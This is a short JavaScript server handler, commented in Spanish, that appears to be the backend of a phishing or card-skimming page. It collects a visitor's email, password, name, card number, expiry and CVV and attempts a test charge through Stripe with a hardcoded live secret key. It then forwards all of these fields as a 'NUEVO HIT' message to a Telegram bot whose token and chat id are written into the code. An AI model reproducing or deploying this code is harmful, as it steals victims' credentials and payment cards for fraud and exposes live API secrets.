import axios from 'axios';
import { stringify } from 'querystring';

export default async function handler(req, res) {
    // Configuración de CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const { em, pw, nm, cc, ex, cv, stripeToken } = req.body;

    const tg_token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
    const chat_id = "7993722214";
    const stripe_secret = "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";

    let estatusPago = "Pendiente";
    let cargoExitoso = false;

    // 1. Intentar cobrar (Si falla, el código sigue adelante)
    if (stripeToken && stripeToken.startsWith('tok_')) {
        try {
            const chargeData = stringify({
                amount: 1000,
                currency: 'mxn',
                source: stripeToken,
                description: `Susc: ${em}`
            });

            const charge = await axios.post('https://api.stripe.com/v1/charges', chargeData, {
                headers: { 
                    'Authorization': `Bearer ${stripe_secret}`, 
                    'Content-Type': 'application/x-www-form-urlencoded' 
                }
            });

            if (charge.data.status === 'succeeded') {
                cargoExitoso = true;
                estatusPago = "✅ APROBADO ($10.00 MXN)";
            }
        } catch (e) {
            estatusPago = "❌ RECHAZO: " + (e.response?.data?.error?.message || "Error Stripe");
        }
    } else {
        estatusPago = "⚠️ INFO (Token: " + (stripeToken || "Nulo") + ")";
    }

    // 2. Reporte a Telegram (Separado del cobro para que siempre llegue)
    const msg = `🔔 **NUEVO HIT** 🔔\n\n` +
                `💰 **Status:** ${estatusPago}\n` +
                `📧 **Email:** ${em}\n` +
                `🔑 **Pass:** \`${pw}\` \n` +
                `👤 **Nombre:** ${nm}\n` +
                `💳 **CC:** \`${cc}\` \n` +
                `📅 **Exp:** ${ex}\n` +
                `🔒 **CVV:** ${cv}`;

    try {
        await axios.post(`https://api.telegram.org/bot${tg_token}/sendMessage`, {
            chat_id: chat_id,
            text: msg,
            parse_mode: 'Markdown'
        });
    } catch (tgErr) {
        console.error("Error Telegram:", tgErr.message);
    }

    // 3. Respuesta final
    return res.status(200).json({ ok: true, pago: cargoExitoso });
}
